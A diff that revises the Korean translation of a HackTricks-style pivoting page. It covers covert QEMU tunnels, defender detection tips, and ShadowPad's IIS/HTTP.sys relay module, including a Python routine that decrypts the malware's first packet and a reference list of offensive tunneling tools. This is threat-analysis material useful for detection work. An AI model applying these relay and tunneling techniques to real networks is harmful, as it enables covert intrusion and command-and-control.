-• 호스트 전용 프로세스 검사는 guest 프로세스를 검사하지 않을 수 있지만, virtualization이 회피를 보장하는 것은 아닙니다. network, QEMU 및 image telemetry를 통해 여전히 노출될 수 있습니다.<sup>[[1]](#references)[[51]](#references)</sup>
+• Host에는 여전히 QEMU process, qcow2 image 및 host에서 forward된 listener가 노출됩니다.
+• Host 전용 process scan은 guest process를 검사하지 않을 수 있지만, virtualization이 회피를 보장하는 것은 아닙니다. Network, QEMU 및 image telemetry를 통해 여전히 노출될 수 있습니다.<sup>[[1]](#references)[[51]](#references)</sup>
 
 ### Defender 팁
 
-• 사용자 쓰기 가능 경로에 있는 **예상치 못한 QEMU/VirtualBox/KVM binaries**를 탐지합니다.
-• `qemu-system*.exe`에서 시작되는 outbound connections를 차단합니다.
-• QEMU 실행 직후 binding되는 드문 listening ports(2222, 10022, …)를 탐색합니다.
+• User-writable path에서 **예상치 못한 QEMU/VirtualBox/KVM binary**를 탐지하도록 alert를 설정합니다.
+• `qemu-system*.exe`에서 시작되는 outbound connection을 차단합니다.
+• QEMU launch 직후 binding되는 드문 listening port(2222, 10022, …)를 탐색합니다.
 
-## `HttpAddUrl`을 통한 IIS/HTTP.sys relay nodes (ShadowPad)
+## `HttpAddUrl`을 통한 IIS/HTTP.sys relay node (ShadowPad)
 
-Check Point는 ShadowPad의 IIS module이 `HttpAddUrl`을 통해 URL prefixes를 binding하여 침해된 perimeter web servers를 backdoor 및 relay nodes로 전환한다고 설명합니다.<sup>[[3]](#references)</sup>
+Check Point는 ShadowPad의 IIS module이 `HttpAddUrl`을 통해 URL prefix를 binding하여 침해된 perimeter web server를 backdoor 및 relay node로 전환한다고 설명합니다.<sup>[[3]](#references)</sup>
 
-동일한 보고서에서는 아래에 요약된 defaults, wildcard listeners, packet decryption, relay queues 및 debug telemetry도 자세히 설명합니다.<sup>[[3]](#references)</sup>
+동일한 report에서는 아래에 요약된 defaults, wildcard listener, packet decryption, relay queue 및 debug telemetry를 자세히 설명합니다.<sup>[[3]](#references)</sup>
 
-* **Config defaults** – module의 JSON config에 값이 없으면 그럴듯한 IIS defaults(`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`)로 대체됩니다. 이렇게 하면 정상적인 traffic은 올바른 branding으로 IIS가 응답합니다.
-* **Wildcard interception** – operators는 URL prefixes의 세미콜론으로 구분된 목록(host + path의 wildcards)을 제공합니다. module은 각 항목에 대해 `HttpAddUrl`을 호출하므로 HTTP.sys가 일치하는 requests를 malicious handler로 라우팅합니다. 일치하지 않는 requests는 일반 IIS 동작으로 fallback됩니다.
-* **Encrypted first packet** – request body의 처음 2바이트에는 custom 32-bit PRNG의 seed가 포함됩니다. 이후 모든 byte는 protocol parsing 전에 생성된 keystream과 XOR됩니다.
+* **Config defaults** – module의 JSON config에서 값이 누락되면 그럴듯한 IIS defaults(`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`)로 fallback합니다. 이렇게 하면 benign traffic은 올바른 branding과 함께 IIS에서 응답됩니다.
+* **Wildcard interception** – Operator는 URL prefix의 세미콜론으로 구분된 list(host 및 path의 wildcard 포함)를 제공합니다. module은 각 entry에 대해 `HttpAddUrl`을 호출하므로 HTTP.sys가 일치하는 request를 malicious handler로 route합니다. 일치하지 않는 request는 정상적인 IIS 동작으로 fallback합니다.
+* **Encrypted first packet** – request body의 처음 두 byte는 custom 32-bit PRNG의 seed를 전달합니다. Protocol parsing 전에 이후의 모든 byte가 생성된 keystream과 XOR됩니다.
 
 ```python
 def decrypt_first_packet(buf):
@@ -798,8 +836,8 @@ out[i] ^= num & 0xFF
 return out
 ```
 
-* **Relay orchestration** – module은 두 개의 lists를 유지합니다. 하나는 “servers”(upstream nodes)이고 다른 하나는 “clients”(downstream implants)입니다. 약 30초 이내에 heartbeat가 도착하지 않으면 entries가 제거됩니다. 두 lists가 모두 비어 있지 않으면 첫 번째 healthy server와 첫 번째 healthy client를 pairing하고, 한쪽이 connection을 close할 때까지 두 sockets 사이에서 bytes를 그대로 전달합니다.
-* **Debug telemetry** – optional logging은 각 pairing에 대해 source IP, destination IP 및 total forwarded bytes를 기록합니다. investigators는 이러한 breadcrumbs를 사용하여 여러 victims에 걸쳐 구성된 ShadowPad mesh를 재구성했습니다.
+* **Relay orchestration** – module은 두 개의 list를 유지합니다. “servers”(upstream node)와 “clients”(downstream implant)입니다. 약 30초 이내에 heartbeat가 도착하지 않으면 entry가 정리됩니다. 두 list가 모두 비어 있지 않으면 첫 번째 정상 server와 첫 번째 정상 client를 pairing하고, 한쪽이 connection을 닫을 때까지 두 socket 사이에서 byte를 단순히 pipe합니다.
+* **Debug telemetry** – optional logging은 각 pairing에 대해 source IP, destination IP 및 총 forwarded byte를 기록합니다. Investigators는 이러한 breadcrumb를 사용하여 여러 victim에 걸친 ShadowPad mesh를 재구성했습니다.
 
 ---
 
@@ -810,16 +848,16 @@ return out
 
 ## References
 
-- [1] [Shadows에 숨기기: QEMU Virtualization을 통한 Covert Tunnels](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
-- [2] [Check Point Research – ToolShell 이전: Storm-2603의 이전 Ransomware Operations 탐색](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
+- [1] [Shadows 속에 숨기: QEMU Virtualization을 통한 Covert Tunnel](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [2] [Check Point Research – ToolShell 이전: Storm-2603의 과거 Ransomware Operation 분석](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 - [3] [Check Point Research – Ink Dragon 내부: Stealthy Offensive Operation의 Relay Network 및 내부 동작 공개](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
 - [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
-- [5] [Nmap Reference Guide: Firewall/IDS Restrictions 우회](https://nmap.org/book/man-bypass-firewalls-ids.html)
+- [5] [Nmap Reference Guide: Firewall/IDS Restriction 우회](https://nmap.org/book/man-bypass-firewalls-ids.html)
 - [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
 - [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
 - [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
 - [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
-- [10] [Metasploit: Metasploit에서 Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
+- [10] [Metasploit: Metasploit에서의 Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
 - [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
 - [12] [Metasploit autoroute module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
 - [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
@@ -862,4 +900,6 @@ return out
 - [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
 - [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
 - [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
+- [53] [NetSPI BOFScale source repository](https://github.com/NetSPI/BOFscale)
+- [54] [BOFScale: BOF-PE에서 시작된 CDN-Fronted Tailnet](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
 {{#include ../banners/hacktricks-training.md}}
